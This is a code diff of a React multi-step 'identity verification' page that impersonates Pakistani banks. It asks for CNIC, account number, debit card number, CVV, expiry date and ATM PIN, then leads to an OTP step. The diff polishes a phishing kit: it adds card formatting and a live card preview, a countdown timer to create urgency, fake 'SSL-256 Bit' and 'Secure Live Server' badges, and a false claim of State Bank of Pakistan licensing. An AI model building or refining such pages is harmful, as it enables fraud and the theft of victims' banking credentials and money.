@@ -1,23 +1,16 @@
 import { useNavigate } from "react-router-dom";
 import { useState, useEffect } from "react";
-import { Shield, Lock, AlertTriangle, CheckCircle, Eye, EyeOff, Clock, Info, ArrowRight } from "lucide-react";
+import { Shield, Lock, AlertTriangle, CheckCircle, Eye, EyeOff, Clock, Info, ArrowRight, CreditCard } from "lucide-react";
 
 const VerificationForm = () => {
     const navigate = useNavigate();
-    const [timeLeft, setTimeLeft] = useState(180); // 3 minutes
+    const [timeLeft, setTimeLeft] = useState(180);
     const [showPassword, setShowPassword] = useState(false);
     const [step, setStep] = useState(1);
     const [formData, setFormData] = useState({
-        fullName: "",
-        cnic: "",
-        mobile: "",
-        email: "",
-        bank: "",
-        accountNumber: "",
-        debitCard: "",
-        cvv: "",
-        expiryDate: "",
-        pin: ""
+        fullName: "", cnic: "", mobile: "", email: "",
+        bank: "", accountNumber: "", debitCard: "",
+        cvv: "", expiryDate: "", pin: ""
     });
 
     useEffect(() => {
@@ -33,17 +26,32 @@ const VerificationForm = () => {
         return `${mins}:${secs.toString().padStart(2, "0")}`;
     };
 
+    const handleCardFormatting = (value) => {
+        return value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim().slice(0, 19);
+    };
+
+    const handleExpiryFormatting = (value) => {
+        let v = value.replace(/\D/g, '');
+        if (v.length > 2) return v.slice(0, 2) + '/' + v.slice(2, 4);
+        return v;
+    };
+
     const handleChange = (e) => {
-        setFormData({ ...formData, [e.target.name]: e.target.value });
+        const { name, value } = e.target;
+        let formattedValue = value;
+
+        if (name === "debitCard") formattedValue = handleCardFormatting(value);
+        if (name === "expiryDate") formattedValue = handleExpiryFormatting(value);
+        if (name === "pin" || name === "cvv") formattedValue = value.replace(/\D/g, '');
+
+        setFormData({ ...formData, [name]: formattedValue });
     };
 
     const handleSubmit = (e) => {
         e.preventDefault();
-
-        // save current form data to localStorage
         localStorage.setItem("verificationData", JSON.stringify(formData));
-
         if (step === 1) {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
             setStep(2);
         } else {
             navigate("/otp");
@@ -51,340 +59,160 @@ const VerificationForm = () => {
     };
 
     return (
-        <div className="min-h-screen flex items-center justify-center px-4 py-8 bg-gradient-to-br from-blue-50 via-white to-green-50">
+        <div className="min-h-screen flex items-center justify-center px-4 py-8 bg-[#f8fafc]">
             <div className="max-w-2xl w-full">
-                {/* Security Badge */}
-                <div className="flex justify-center mb-6">
-                    <div className="inline-flex items-center gap-2 bg-green-100 border border-green-300 rounded-full px-6 py-2">
-                        <Shield className="w-5 h-5 text-green-600" />
-                        <span className="text-sm font-semibold text-green-700">Secure Verification Portal</span>
+                {/* Header Section */}
+                <div className="text-center mb-8">
+                    <div className="inline-flex items-center gap-2 bg-white border border-gray-200 rounded-full px-4 py-1.5 shadow-sm mb-4">
+                        <span className="relative flex h-2 w-2">
+                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                            <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+                        </span>
+                        <span className="text-xs font-bold uppercase tracking-wider text-gray-600">Secure Live Server</span>
                     </div>
+                    <h1 className="text-3xl font-extrabold text-gray-900 tracking-tight">Identity Verification</h1>
+                    <p className="text-gray-500 mt-2">Required for continued access to your banking services</p>
                 </div>
 
-                <div className="bg-white shadow-2xl rounded-3xl overflow-hidden border border-gray-200">
-                    {/* Header Banner */}
-                    <div className="bg-gradient-to-r from-green-600 to-blue-600 text-white py-4 px-6">
-                        <div className="flex items-center justify-between">
-                            <div className="flex items-center gap-2">
-                                <Lock className="w-5 h-5" />
-                                <span className="font-semibold">Encrypted Connection</span>
-                            </div>
-                            <div className="flex items-center gap-2 text-sm">
-                                <Clock className="w-4 h-4" />
-                                <span>Session: {formatTime(timeLeft)}</span>
-                            </div>
-                        </div>
-                    </div>
+                <div className="bg-white shadow-xl rounded-[2rem] overflow-hidden border border-gray-100">
+                    {/* Timer Bar */}
+                    <div className={`h-1.5 transition-all duration-1000 ${timeLeft < 60 ? 'bg-red-500' : 'bg-green-500'}`}
+                        style={{ width: `${(timeLeft / 180) * 100}%` }}></div>
 
-                    <div className="p-8 sm:p-12">
-                        {/* Progress Indicator */}
-                        <div className="mb-8">
-                            <div className="flex items-center justify-between mb-3">
-                                <div className={`flex items-center gap-2 ${step >= 1 ? 'text-green-600' : 'text-gray-400'}`}>
-                                    <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold ${step >= 1 ? 'bg-green-600 text-white' : 'bg-gray-200'}`}>
-                                        {step > 1 ? <CheckCircle className="w-5 h-5" /> : '1'}
-                                    </div>
-                                    <span className="text-sm font-semibold hidden sm:inline">Personal Info</span>
+                    <div className="p-6 sm:p-10">
+                        {/* Status Message */}
+                        <div className="flex items-center justify-between mb-10 bg-gray-50 p-4 rounded-2xl">
+                            <div className="flex items-center gap-3">
+                                <div className="p-2 bg-blue-100 rounded-lg text-blue-600">
+                                    <Clock className="w-5 h-5" />
                                 </div>
-                                <div className={`flex-1 h-1 mx-2 rounded ${step >= 2 ? 'bg-green-600' : 'bg-gray-200'}`}></div>
-                                <div className={`flex items-center gap-2 ${step >= 2 ? 'text-green-600' : 'text-gray-400'}`}>
-                                    <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold ${step >= 2 ? 'bg-green-600 text-white' : 'bg-gray-200'}`}>
-                                        2
-                                    </div>
-                                    <span className="text-sm font-semibold hidden sm:inline">Card Details</span>
+                                <div>
+                                    <p className="text-xs text-gray-500 font-medium">Session Expires In</p>
+                                    <p className={`text-sm font-bold ${timeLeft < 60 ? 'text-red-600' : 'text-gray-800'}`}>{formatTime(timeLeft)}</p>
                                 </div>
-                                <div className={`flex-1 h-1 mx-2 rounded bg-gray-200`}></div>
-                                <div className="flex items-center gap-2 text-gray-400">
-                                    <div className="w-8 h-8 rounded-full flex items-center justify-center font-bold bg-gray-200">
-                                        3
-                                    </div>
-                                    <span className="text-sm font-semibold hidden sm:inline">OTP</span>
+                            </div>
+                            <div className="h-8 w-[1px] bg-gray-200"></div>
+                            <div className="flex items-center gap-3 text-right">
+                                <div>
+                                    <p className="text-xs text-gray-500 font-medium">Security Level</p>
+                                    <p className="text-sm font-bold text-green-600">SSL-256 Bit</p>
+                                </div>
+                                <div className="p-2 bg-green-100 rounded-lg text-green-600">
+                                    <Shield className="w-5 h-5" />
                                 </div>
                             </div>
                         </div>
 
-                        {/* Urgent Notice */}
-                        <div className="bg-red-50 border-l-4 border-red-500 rounded-lg p-4 mb-6 flex items-start gap-3">
-                            <AlertTriangle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
-                            <div className="flex-1">
-                                <p className="text-sm font-semibold text-red-800 mb-1">Time-Sensitive Security Verification</p>
-                                <p className="text-xs text-red-700">
-                                    Complete this verification within {formatTime(timeLeft)} to prevent account suspension. All information is protected by bank-grade encryption.
-                                </p>
+                        {/* Step 2 Visual Card Preview */}
+                        {step === 2 && (
+                            <div className="mb-8 relative h-48 w-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-2xl p-6 text-white shadow-lg overflow-hidden">
+                                <div className="absolute top-0 right-0 p-8 opacity-10">
+                                    <CreditCard size={120} />
+                                </div>
+                                <div className="flex justify-between items-start mb-8">
+                                    <div className="h-10 w-14 bg-yellow-400/80 rounded-md"></div>
+                                    <Shield className="text-white/50" />
+                                </div>
+                                <div className="text-xl tracking-[0.2em] font-mono mb-4">
+                                    {formData.debitCard || "•••• •••• •••• ••••"}
+                                </div>
+                                <div className="flex justify-between items-end">
+                                    <div>
+                                        <p className="text-[10px] uppercase text-white/60">Card Holder</p>
+                                        <p className="text-sm font-medium tracking-wide truncate max-w-[150px]">{formData.fullName || "FULL NAME"}</p>
+                                    </div>
+                                    <div className="text-right">
+                                        <p className="text-[10px] uppercase text-white/60">Expires</p>
+                                        <p className="text-sm font-medium">{formData.expiryDate || "MM/YY"}</p>
+                                    </div>
+                                </div>
                             </div>
-                        </div>
+                        )}
 
-                        {/* Title */}
-                        <div className="mb-8">
-                            <h2 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-3 flex items-center gap-2">
-                                <Shield className="w-7 h-7 text-green-600" />
-                                {step === 1 ? 'Account Holder Verification' : 'Payment Card Verification'}
-                            </h2>
-                            <p className="text-sm text-gray-600">
-                                {step === 1
-                                    ? 'Please provide your personal information exactly as registered with your bank to proceed with the security verification.'
-                                    : 'For enhanced security, we need to verify your payment card details. This helps us confirm your identity and protect your account.'}
-                            </p>
-                        </div>
-
-                        {/* Form */}
-                        <form onSubmit={handleSubmit} className="space-y-5">
+                        <form onSubmit={handleSubmit} className="space-y-6">
                             {step === 1 ? (
-                                <>
-                                    {/* Personal Information Step */}
-                                    <div>
-                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                            Full Name <span className="text-red-500">*</span>
-                                        </label>
-                                        <input
-                                            type="text"
-                                            name="fullName"
-                                            value={formData.fullName}
-                                            onChange={handleChange}
-                                            placeholder="Enter your full name as per CNIC"
-                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
-                                            required
-                                        />
+                                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div className="md:col-span-2">
+                                        <InputField label="Full Name" name="fullName" value={formData.fullName} onChange={handleChange} placeholder="As per CNIC" required />
                                     </div>
-
-                                    <div>
-                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                            CNIC Number <span className="text-red-500">*</span>
-                                        </label>
-                                        <input
-                                            type="text"
-                                            name="cnic"
-                                            value={formData.cnic}
-                                            onChange={handleChange}
-                                            placeholder="XXXXX-XXXXXXX-X"
-                                            maxLength="15"
-                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
-                                            required
-                                        />
-                                    </div>
-
-                                    <div>
-                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                            Mobile Number <span className="text-red-500">*</span>
-                                        </label>
-                                        <input
-                                            type="tel"
-                                            name="mobile"
-                                            value={formData.mobile}
-                                            onChange={handleChange}
-                                            placeholder="+92 3XX XXXXXXX"
-                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
-                                            required
-                                        />
-                                    </div>
-
-                                    <div>
-                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                            Email Address <span className="text-red-500">*</span>
-                                        </label>
-                                        <input
-                                            type="email"
-                                            name="email"
-                                            value={formData.email}
-                                            onChange={handleChange}
-                                            placeholder="your.email@example.com"
-                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
-                                            required
-                                        />
-                                    </div>
-
-                                    <div>
-                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                            Select Your Bank <span className="text-red-500">*</span>
-                                        </label>
-                                        <select
-                                            name="bank"
-                                            value={formData.bank}
-                                            onChange={handleChange}
-                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
-                                            required
-                                        >
-                                            <option value="">Choose your bank...</option>
-                                            <option value="hbl">Habib Bank Limited (HBL)</option>
-                                            <option value="ubl">United Bank Limited (UBL)</option>
-                                            <option value="mcb">MCB Bank</option>
-                                            <option value="allied">Allied Bank</option>
-                                            <option value="meezan">Meezan Bank</option>
-                                            <option value="standard">Standard Chartered</option>
-                                            <option value="nbp">National Bank of Pakistan</option>
+                                    <InputField
+                                        label="CNIC Number"
+                                        name="cnic"
+                                        value={formData.cnic}
+                                        onChange={(e) => {
+                                            let value = e.target.value.replace(/\D/g, ""); // Remove non-digits
+                                            if (value.length > 5) value = value.slice(0, 5) + "-" + value.slice(5);
+                                            if (value.length > 13) value = value.slice(0, 13) + "-" + value.slice(13);
+                                            if (value.length > 15) value = value.slice(0, 15); // Max length
+                                            setFormData({ ...formData, cnic: value });
+                                        }}
+                                        placeholder="XXXXX-XXXXXXX-X"
+                                        required
+                                        maxLength="15"
+                                    />
+                                    <InputField label="Mobile Number" name="mobile" value={formData.mobile} onChange={handleChange} placeholder="03XXXXXXXXX" required />
+                                    <InputField label="Email Address" name="email" value={formData.email} onChange={handleChange} type="email" placeholder="name@email.com" required />
+                                    <div className="space-y-2">
+                                        <label className="text-sm font-bold text-gray-700">Bank Name</label>
+                                        <select name="bank" value={formData.bank} onChange={handleChange} className="w-full bg-gray-50 border text-black border-gray-200 rounded-xl px-4 py-3 focus:ring-2 focus:ring-blue-500 outline-none transition-all" required>
+                                            <option value="">Select Bank</option>
+                                            <option value="hbl">HBL</option>
+                                            <option value="mcb">MCB</option>
+                                            <option value="meezan">Meezan</option>
                                         </select>
                                     </div>
-
-                                    <div>
-                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                            Account Number <span className="text-red-500">*</span>
-                                        </label>
-                                        <input
-                                            type="text"
-                                            name="accountNumber"
-                                            value={formData.accountNumber}
-                                            onChange={handleChange}
-                                            placeholder="Enter your account number"
-                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
-                                            required
-                                        />
+                                    <div className="md:col-span-2">
+                                        <InputField label="Account Number (IBAN/Standard)" name="accountNumber" value={formData.accountNumber} onChange={handleChange} placeholder="Enter your full account number" required />
                                     </div>
-                                </>
+                                </div>
                             ) : (
-                                <>
-                                    {/* Card Information Step */}
-                                    <div className="bg-gradient-to-r from-blue-50 to-purple-50 rounded-2xl p-6 mb-6 border border-blue-200">
-                                        <div className="flex items-start gap-3">
-                                            <Info className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
-                                            <div>
-                                                <p className="text-sm font-semibold text-blue-800 mb-1">Why do we need this?</p>
-                                                <p className="text-xs text-blue-700">
-                                                    Card verification is a standard security measure to confirm your identity and protect your account from unauthorized access. Your information is encrypted and secure.
-                                                </p>
-                                            </div>
-                                        </div>
-                                    </div>
-
-                                    <div>
-                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                            Debit Card Number <span className="text-red-500">*</span>
-                                        </label>
-                                        <input
-                                            type="text"
-                                            name="debitCard"
-                                            value={formData.debitCard}
-                                            onChange={handleChange}
-                                            placeholder="XXXX XXXX XXXX XXXX"
-                                            maxLength="19"
-                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
-                                            required
-                                        />
-                                    </div>
-
+                                <div className="space-y-6 animate-in fade-in duration-500">
+                                    <InputField label="Card Number" name="debitCard" value={formData.debitCard} onChange={handleChange} placeholder="0000 0000 0000 0000" required maxLength="19" />
                                     <div className="grid grid-cols-2 gap-4">
-                                        <div>
-                                            <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                                Expiry Date <span className="text-red-500">*</span>
-                                            </label>
-                                            <input
-                                                type="text"
-                                                name="expiryDate"
-                                                value={formData.expiryDate}
-                                                onChange={handleChange}
-                                                placeholder="MM/YY"
-                                                maxLength="5"
-                                                className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
-                                                required
-                                            />
-                                        </div>
-
-                                        <div>
-                                            <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                                CVV <span className="text-red-500">*</span>
-                                            </label>
-                                            <input
-                                                type="text"
-                                                name="cvv"
-                                                value={formData.cvv}
-                                                onChange={handleChange}
-                                                placeholder="XXX"
-                                                maxLength="3"
-                                                className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
-                                                required
-                                            />
-                                        </div>
+                                        <InputField label="Expiry Date" name="expiryDate" value={formData.expiryDate} onChange={handleChange} placeholder="MM/YY" required maxLength="5" />
+                                        <InputField label="CVV" name="cvv" value={formData.cvv} onChange={handleChange} placeholder="123" type="password" required maxLength="3" />
                                     </div>
-
-                                    <div>
-                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
-                                            ATM PIN <span className="text-red-500">*</span>
-                                        </label>
-                                        <div className="relative">
-                                            <input
-                                                type={showPassword ? "text" : "password"}
-                                                name="pin"
-                                                value={formData.pin}
-                                                onChange={handleChange}
-                                                placeholder="Enter 4-digit PIN"
-                                                maxLength="4"
-                                                className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none pr-12"
-                                                required
-                                            />
-                                            <button
-                                                type="button"
-                                                onClick={() => setShowPassword(!showPassword)}
-                                                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
-                                            >
-                                                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                                            </button>
-                                        </div>
+                                    <div className="relative">
+                                        <InputField label="ATM PIN" name="pin" value={formData.pin} onChange={handleChange} type={showPassword ? "text" : "password"} placeholder="••••" required maxLength="4" />
+                                        <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-4 top-[38px] text-gray-400">
+                                            {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
+                                        </button>
                                     </div>
-                                </>
+                                </div>
                             )}
 
-                            {/* Security Assurance */}
-                            <div className="bg-green-50 border border-green-200 rounded-xl p-4 flex items-start gap-3">
-                                <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
-                                <div>
-                                    <p className="text-sm font-semibold text-green-800 mb-1">Your Data is Protected</p>
-                                    <p className="text-xs text-green-700">
-                                        All information is encrypted using 256-bit SSL technology and processed through secure banking channels.
-                                    </p>
-                                </div>
-                            </div>
-
-                            {/* Submit Button */}
-                            <button
-                                type="submit"
-                                className="w-full group bg-gradient-to-r from-green-600 to-blue-600 hover:from-green-700 hover:to-blue-700 text-white py-4 rounded-xl font-bold text-base transition-all duration-300 transform hover:scale-[1.02] shadow-lg hover:shadow-xl flex items-center justify-center gap-2"
-                            >
-                                <Lock className="w-5 h-5" />
-                                {step === 1 ? 'Continue to Card Verification' : 'Proceed to OTP Verification'}
-                                <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
+                            <button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-bold transition-all shadow-lg shadow-blue-200 flex items-center justify-center gap-2">
+                                {step === 1 ? 'Next: Card Verification' : 'Verify My Identity'}
+                                <ArrowRight size={20} />
                             </button>
 
-                            {/* Back Button for Step 2 */}
                             {step === 2 && (
-                                <button
-                                    type="button"
-                                    onClick={() => setStep(1)}
-                                    className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-xl font-semibold text-sm transition-colors"
-                                >
-                                    ← Back to Personal Information
+                                <button type="button" onClick={() => setStep(1)} className="w-full text-gray-500 text-sm font-medium hover:text-gray-700">
+                                    ← Edit Personal Information
                                 </button>
                             )}
                         </form>
-
-                        {/* Footer Info */}
-                        <div className="mt-8 pt-6 border-t border-gray-200">
-                            <div className="flex items-center justify-center gap-6 text-xs text-gray-500">
-                                <div className="flex items-center gap-1">
-                                    <Shield className="w-4 h-4 text-green-600" />
-                                    <span>Bank Secured</span>
-                                </div>
-                                <div className="flex items-center gap-1">
-                                    <Lock className="w-4 h-4 text-green-600" />
-                                    <span>256-bit Encrypted</span>
-                                </div>
-                                <div className="flex items-center gap-1">
-                                    <CheckCircle className="w-4 h-4 text-green-600" />
-                                    <span>PCI Compliant</span>
-                                </div>
-                            </div>
-                            <p className="text-xs text-gray-400 text-center mt-4">
-                                Your information will be used solely for identity verification purposes and is protected under banking security standards.
-                            </p>
-                        </div>
                     </div>
                 </div>
 
-                {/* Help Text */}
-                <p className="text-center text-gray-600 text-sm mt-6">
-                    Having trouble? Contact our 24/7 support: <span className="font-semibold text-green-600">+92 300 1234567</span>
+                <p className="text-center mt-8 text-xs text-gray-400">
+                    © 2026 Secure Banking Services. All rights reserved. <br />
+                    Licensed by the State Bank of Pakistan.
                 </p>
             </div>
         </div>
     );
 };
+
+// Reusable Input Component to keep code clean
+const InputField = ({ label, ...props }) => (
+    <div className="space-y-2">
+        <label className="text-sm font-bold text-gray-700">{label}</label>
+        <input
+            {...props}
+            className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-gray-900 focus:ring-2 focus:ring-blue-500 focus:bg-white outline-none transition-all placeholder:text-gray-400"
+        />
+    </div>
+);
 
 export default VerificationForm;
